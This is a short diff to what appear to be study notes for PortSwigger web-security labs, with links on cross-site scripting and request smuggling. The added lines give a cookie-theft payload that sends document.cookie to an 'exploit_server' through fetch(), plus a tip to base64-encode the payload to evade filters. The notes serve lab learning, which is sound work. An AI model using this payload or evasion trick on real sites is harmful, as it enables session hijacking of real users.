@@ -57,6 +57,13 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 XSS大概率是要bypass的，可以参考这个
 https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
 
+How to get victim's cookie?
+1. fetch('exploit_server/?document.cookie()')
+
+If it is blocked, you may need to encode with base64. You can first base64 with btoa(payload) in your browser's console. Then you can use atob(payload) as your final payload.
+
+
+
 2. 通过请求走私
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
 https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss
